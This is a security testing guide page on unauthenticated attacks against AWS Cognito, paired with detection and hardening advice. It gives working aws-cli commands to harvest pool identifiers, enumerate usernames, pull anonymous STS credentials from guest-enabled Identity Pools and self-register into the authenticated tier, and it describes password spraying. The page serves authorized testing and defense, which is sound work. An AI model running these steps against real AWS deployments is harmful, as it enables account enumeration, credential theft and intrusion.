---
cstg_id: CSTG-AWS-COGNITO-UNAUTH
title: "AWS Cognito - Unauthenticated Access"
provider: aws
service: cognito
phase: unauthenticated
required_access: unauthenticated
required_permissions: []
tools:
  - aws-cli
  - cognito-scanner
  - curl
  - jq
references:
  - "https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-identity.html"
  - "https://docs.aws.amazon.com/cognito/latest/developerguide/identity-pools.html"
  - "https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-user-identity-pools.html"
  - "https://docs.aws.amazon.com/cognito-user-identity-pools/latest/APIReference/API_SignUp.html"
  - "https://docs.aws.amazon.com/cognitoidentity/latest/APIReference/API_GetId.html"
  - "https://hackingthe.cloud/aws/exploitation/cognito_identity_pool_excessive_privileges/"
  - "https://rhinosecuritylabs.com/aws/assume-roles-aws-cognito-unauthenticated-pools/"
license: CC BY-SA 4.0
---

## Summary

Amazon Cognito provides two distinct but frequently combined components: **User Pools** (a managed identity provider that authenticates users and issues OIDC/JWT tokens) and **Identity Pools**, formerly *Cognito Federated Identities* (a service that exchanges an identity token - or no token at all - for temporary AWS IAM credentials via STS). Both components are designed to be reached directly by untrusted client applications such as single-page web apps and mobile apps, so their public-facing API endpoints and the identifiers needed to call them (User Pool IDs, App Client IDs, Identity Pool IDs) are routinely embedded in client-side JavaScript bundles, mobile binaries, and HTML.

This page covers what an unauthenticated, external party can do against a Cognito deployment with nothing more than identifiers harvested from a public application. The attacker objectives are: (1) **self-service account creation** when public sign-up is enabled, allowing an outsider to obtain a valid authenticated identity; (2) **username/email enumeration** through differential responses; (3) **obtaining real, usable AWS credentials** from an Identity Pool that allows the unauthenticated (guest) role; and (4) **abusing a misconfigured authenticated role** reachable after self-registration. Identity Pools that grant overly permissive guest roles are one of the most impactful unauthenticated AWS findings, because they turn an anonymous internet user into a holder of valid `AKIA`/`ASIA` credentials inside the target account.

## Prerequisites

- **Access level:** Unauthenticated. No AWS account, no credentials, and no prior authorization are required to call the public Cognito endpoints.
- **What you need to discover first:** one or more of the following public identifiers, all of which are intended to be client-visible:
  - **User Pool ID** - format `<region>_<random>` (e.g. `us-east-1_AbCdEf123`).
  - **App Client ID** - a 26-character alphanumeric string. Public app clients used by SPAs/mobile have no client secret.
  - **Identity Pool ID** - format `<region>:<uuid>` (e.g. `us-east-1:12345678-1234-1234-1234-123456789012`).
- The region is embedded in every identifier, so endpoint construction is deterministic.

These values are commonly found in: JavaScript bundles (`main.*.js`), `aws-exports.js` / `amplifyconfiguration.json` produced by AWS Amplify, mobile app resources (`strings.xml`, `Info.plist`, decompiled APK/IPA), HTML, environment-config endpoints, and source maps.

## Enumeration

### Harvesting identifiers from a target application

Search retrieved client assets for the well-known identifier patterns:

```bash
# Identity Pool IDs (region:uuid)
grep -roE '[a-z]{2}-[a-z]+-[0-9]:[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' ./app_assets/

# User Pool IDs (region_random)
grep -roE '[a-z]{2}-[a-z]+-[0-9]_[A-Za-z0-9]{9,}' ./app_assets/

# Amplify config commonly bundles all three
grep -roE '"(aws_user_pools_id|aws_user_pools_web_client_id|aws_cognito_identity_pool_id|region)"\s*:\s*"[^"]+"' ./app_assets/
```

Amplify's `aws-exports.js` is especially valuable as it links the User Pool, App Client, and Identity Pool together for the same application.

### Identifying the Cognito endpoints

Cognito uses unauthenticated public service endpoints. All calls are HTTPS POST with an `X-Amz-Target` header naming the operation; no SigV4 signing is required for the operations below.

- User Pools (`cognito-idp`): `https://cognito-idp.<region>.amazonaws.com/`
- Identity Pools (`cognito-identity`): `https://cognito-identity.<region>.amazonaws.com/`

### User Pool client introspection

If you have an App Client ID, retrieve its public configuration. This reveals enabled auth flows, read/write attributes, and OAuth scopes - useful for planning sign-up and authentication:

```bash
aws cognito-idp describe-user-pool-client \
  --user-pool-id us-east-1_AbCdEf123 \
  --client-id 1example23clientid456789ab \
  --region us-east-1 --no-sign-request
```

Note: `describe-user-pool-client` typically requires authorization; the practical unauthenticated signal comes from how the public `SignUp`, `InitiateAuth`, and `ForgotPassword` operations respond (below).

### Username / account enumeration

Differential responses to public operations leak whether an account exists, unless the pool has *prevent user existence errors* enabled.

```bash
# SignUp: an existing username returns UsernameExistsException
aws cognito-idp sign-up --region us-east-1 \
  --client-id 1example23clientid456789ab \
  --username victim@example.com --password 'Wrong#Format1' \
  --no-sign-request

# ForgotPassword: legacy/misconfigured pools differentiate existing vs unknown users
aws cognito-idp forgot-password --region us-east-1 \
  --client-id 1example23clientid456789ab \
  --username victim@example.com --no-sign-request
```

When *prevent user existence errors* is **off**, `InitiateAuth` and `ForgotPassword` return distinguishable error codes (`UserNotFoundException` vs `NotAuthorizedException`) and `CodeDeliveryDetails` can confirm a destination address, enabling large-scale enumeration of valid emails/usernames.

## Misconfigurations & Findings

- **Unauthenticated identities enabled on an Identity Pool with a usable guest role.** The single most impactful finding: anyone can call `GetId` + `GetCredentialsForIdentity` and receive STS credentials bound to the pool's unauthenticated role.
- **Over-privileged guest (unauthenticated) IAM role.** The role attached to the guest principal grants more than the app needs - e.g. broad `s3:*`, `dynamodb:*`, `lambda:InvokeFunction`, or wildcard `Resource: *`. See [Identity Pool privilege escalation](../03-privilege-escalation/aws-cognito-privesc.md).
- **`enhanced` (server-side) credential flow with weak role-mapping**, or `basic`/classic flow enabled that lets the caller request an arbitrary role ARN via `GetOpenIdToken` / `AssumeRoleWithWebIdentity`.
- **Public self-service sign-up enabled** on a User Pool whose authenticated users gain meaningful access, allowing an outsider to register and cross into the authenticated trust boundary.
- **Auto-verified / auto-confirmed sign-up**, or a Pre/Post-confirmation Lambda that auto-confirms accounts, removing the email/phone verification barrier.
- **User existence errors not prevented**, enabling username/email enumeration and targeted password attacks.
- **Weak password policy or `USER_PASSWORD_AUTH` (non-SRP) flow enabled**, enabling credential stuffing and password spraying directly against `InitiateAuth`.
- **Sensitive data exposed in custom attributes** readable by the user, or in tokens, after self-registration.

## Exploitation

### Path 1 - Anonymous AWS credentials from a guest-enabled Identity Pool

This requires only the Identity Pool ID and no token whatsoever.

```bash
# 1) Obtain an IdentityId for the pool (anonymous)
aws cognito-identity get-id \
  --identity-pool-id us-east-1:12345678-1234-1234-1234-123456789012 \
  --region us-east-1 --no-sign-request

# -> { "IdentityId": "us-east-1:aaaa...." }

# 2) Exchange the IdentityId for temporary AWS credentials (enhanced flow)
aws cognito-identity get-credentials-for-identity \
  --identity-id us-east-1:aaaa.... \
  --region us-east-1 --no-sign-request

# -> AccessKeyId / SecretKey / SessionToken bound to the unauthenticated role
```

Confirm and operate as the assumed guest role:

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity        # reveals the unauth role ARN and account ID
```

The returned ARN (e.g. `arn:aws:sts::111122223333:assumed-role/Cognito_<pool>Unauth_Role/CognitoIdentityCredentials`) discloses the **AWS account ID** and the role name. From here, enumerate what the guest role can actually do (S3 buckets, DynamoDB tables, Lambda functions, SQS/SNS, etc.). Continue in the [Cognito privilege escalation](../03-privilege-escalation/aws-cognito-privesc.md) page.

### Path 2 - Classic/basic flow with arbitrary role assumption

If the pool's classic (basic) flow is enabled, the caller can fetch an OpenID token and then assume a role via STS web identity, sometimes specifying a role ARN of their choosing if role-mapping is misconfigured:

```bash
aws cognito-identity get-open-id-token \
  --identity-id us-east-1:aaaa.... --region us-east-1 --no-sign-request
# -> { "Token": "<jwt>" }

aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::111122223333:role/Cognito_PoolUnauth_Role \
  --role-session-name guest \
  --web-identity-token <jwt> --region us-east-1
```

### Path 3 - Self-service registration into the authenticated tier

When public sign-up is enabled, register a fresh account to cross into the authenticated trust boundary:

```bash
# Register
aws cognito-idp sign-up --region us-east-1 \
  --client-id 1example23clientid456789ab \
  --username attacker@evil.example --password 'Str0ng#Passw0rd!' \
  --no-sign-request

# Confirm (if a verification code is delivered to the attacker-controlled address)
aws cognito-idp confirm-sign-up --region us-east-1 \
  --client-id 1example23clientid456789ab \
  --username attacker@evil.example --confirmation-code 123456 --no-sign-request

# Authenticate to obtain Id/Access/Refresh tokens
aws cognito-idp initiate-auth --region us-east-1 \
  --client-id 1example23clientid456789ab \
  --auth-flow USER_PASSWORD_AUTH \
  --auth-parameters USERNAME=attacker@evil.example,PASSWORD='Str0ng#Passw0rd!' \
  --no-sign-request
```

If the app's Identity Pool maps authenticated User Pool users to an authenticated IAM role, feed the resulting Id token back through `GetId`/`GetCredentialsForIdentity` with a `Logins` map to obtain authenticated-role AWS credentials:

```bash
aws cognito-identity get-id --region us-east-1 \
  --identity-pool-id us-east-1:12345678-1234-1234-1234-123456789012 \
  --logins cognito-idp.us-east-1.amazonaws.com/us-east-1_AbCdEf123=<IdToken> \
  --no-sign-request

aws cognito-identity get-credentials-for-identity --region us-east-1 \
  --identity-id us-east-1:bbbb.... \
  --logins cognito-idp.us-east-1.amazonaws.com/us-east-1_AbCdEf123=<IdToken> \
  --no-sign-request
```

### Path 4 - Password spraying / credential stuffing

With `USER_PASSWORD_AUTH` enabled and user-existence errors not prevented, spray candidate passwords against `InitiateAuth`. Distinct exceptions (`UserNotFoundException`, `NotAuthorizedException`, `PasswordResetRequiredException`, the `NEW_PASSWORD_REQUIRED` challenge) reveal account state and validity.

## Detection & Logging

- **CloudTrail (data and management events).** Identity Pool operations `GetId`, `GetCredentialsForIdentity`, `GetOpenIdToken`, and `GetOpenIdTokenForDeveloperIdentity` are recorded with `eventSource cognito-identity.amazonaws.com`. Anonymous guest calls appear with no/`Anonymous` `userIdentity` and a `sourceIPAddress` outside expected client ranges. A spike in `GetId`/`GetCredentialsForIdentity` from unfamiliar IPs or data-center ASNs indicates abuse of guest credentials.
- **User Pool operations** `SignUp`, `ConfirmSignUp`, `InitiateAuth`, `RespondToAuthChallenge`, and `ForgotPassword` are recorded with `eventSource cognito-idp.amazonaws.com`. High-volume `SignUp` from one source, or many `InitiateAuth` failures, signals enumeration / spraying.
- **Downstream STS usage.** Once guest/authenticated credentials are issued, the actor's API calls carry the `assumed-role/Cognito_...` ARN; correlate `sts:GetCallerIdentity` and subsequent S3/DynamoDB/Lambda calls under that role.
- **Managed detections.** Amazon GuardDuty flags anomalous credential usage and unusual API patterns. Cognito **advanced security features** (threat protection) detect compromised credentials, impossible travel, and risk-based events; CloudWatch metrics surface sign-up/sign-in surges and throttling.

## Remediation & Hardening

- **Disable unauthenticated (guest) identities** on Identity Pools unless explicitly required (`AllowUnauthenticatedIdentities = false`).
- **Scope the guest and authenticated IAM roles to least privilege.** Restrict to the exact resources/actions the app needs; never use `Resource: *` or service wildcards. Constrain S3 access with the `${cognito-identity.amazonaws.com:sub}` policy variable so each identity reaches only its own prefix.
- **Use the enhanced (server-side) flow with strict role mapping** and disable the classic/basic flow so callers cannot request arbitrary role ARNs. Lock down each role's trust policy with `Condition` on `cognito-identity.amazonaws.com:aud` (the Identity Pool ID) and `amr` (authenticated vs unauthenticated).
- **Enable "prevent user existence errors"** on every app client to suppress enumeration-friendly responses.
- **Disable public self-service sign-up** where users should be provisioned by an administrator; otherwise require verified email/phone and avoid auto-confirmation.
- **Prefer SRP (`USER_SRP_AUTH`)** over `USER_PASSWORD_AUTH`; enforce a strong password policy and MFA.
- **Enable Cognito threat protection / advanced security** (adaptive auth, compromised-credential checks) and rate limiting (WAF) in front of hosted UI / token endpoints.
- **Keep secrets out of client-readable attributes and tokens.** Do not store sensitive data in user-writable/readable custom attributes.

## Tools

- **aws-cli** with `--no-sign-request` to call public Cognito operations anonymously.
- **cognito-scanner / Cognito enumeration utilities** - automate `GetId`/`GetCredentialsForIdentity` and User Pool sign-up/auth-flow probing from a pool ID.
- **curl / HTTP clients** - raw POSTs to `cognito-idp` / `cognito-identity` endpoints using `X-Amz-Target`.
- **jq** - parse identifiers and credential responses.
- **JS bundle / mobile-binary inspection utilities** - extract Cognito identifiers from `aws-exports.js`, source maps, and decompiled apps.

## References

- AWS Cognito Identity Pools - <https://docs.aws.amazon.com/cognito/latest/developerguide/identity-pools.html>
- Cognito Identity (developer guide) - <https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-identity.html>
- Cognito User Pools (developer guide) - <https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-user-identity-pools.html>
- `SignUp` API reference - <https://docs.aws.amazon.com/cognito-user-identity-pools/latest/APIReference/API_SignUp.html>
- `GetId` API reference - <https://docs.aws.amazon.com/cognitoidentity/latest/APIReference/API_GetId.html>
- Hacking the Cloud - Cognito Identity Pool excessive privileges - <https://hackingthe.cloud/aws/exploitation/cognito_identity_pool_excessive_privileges/>
- Rhino Security Labs - Assuming roles via AWS Cognito unauthenticated pools - <https://rhinosecuritylabs.com/aws/assume-roles-aws-cognito-unauthenticated-pools/>
